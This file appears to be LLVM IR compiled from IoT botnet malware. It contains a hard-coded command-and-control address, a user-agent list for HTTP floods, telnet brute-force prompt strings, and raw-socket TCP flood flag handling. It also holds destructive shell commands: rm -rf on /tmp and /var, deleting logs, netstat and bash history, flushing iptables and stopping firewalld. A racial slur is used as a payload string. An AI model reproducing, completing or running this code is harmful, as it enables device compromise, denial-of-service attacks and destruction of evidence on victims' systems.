; ModuleID = 'host/ir_bcf/Execution.i.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.65, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.10 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.12 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.13 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.14 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.15 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.16 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.17 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.18 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.19 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.20 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.21 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.22 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.23 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.24 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.25 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.27 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.28 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.29 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.31 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.32 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.33 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.34 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.36 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.38 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.40 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.41 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.42 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.45 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.47 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.48 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.49 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.50 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.51 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.52 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.53 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.54 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.55 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.56 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.57 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.58 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.59 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.60 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.61 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.62 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.63 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.64 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.65 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@ServerInfo = global [1 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.66, i32 0, i32 0)], align 8
@.str.66 = private unnamed_addr constant [17 x i8] c"178.62.14.63:282\00", align 1
@BusyBoxPayload = global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i32 0, i32 0), align 8
@.str.67 = private unnamed_addr constant [7 x i8] c"Nigger\00", align 1
@usernames = global [1 x i8*] [i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.68, i32 0, i32 0)], align 8
@.str.68 = private unnamed_addr constant [28 x i8] c"Dont Use the Telnet Scanner\00", align 1
@passwords = global [1 x i8*] [i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.69, i32 0, i32 0)], align 8
@.str.69 = private unnamed_addr constant [20 x i8] c"Just dont use it :/\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0), i8* null], align 16
@.str.70 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.72 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.73 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.74 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.75 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.78 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.83, i32 0, i32 0), i8* null], align 16
@.str.80 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.83 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@.str.84 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.86 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.89 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* null], align 16
@.str.91 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.92 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.93 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* null], align 16
@botnetServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@KadenCommStock = global i32 0, align 4
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@botnetPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [32 x i8] c"ay4fkc1txz22mldwtj4ipcevw5q8zq6\00", align 16
@.str.148 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.94 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.95 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.96 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [33 x i8] c"Execution Bruted -> %s [ %s:%s ]\00", align 1
@.str.98 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.102 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.103 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.104 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.105 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.106 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.107 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.108 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.112 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.113 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.114 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.115 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.117 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.118 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.119 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.120 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.125 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.126 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendSTD.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.127, i32 0, i32 0)], align 8
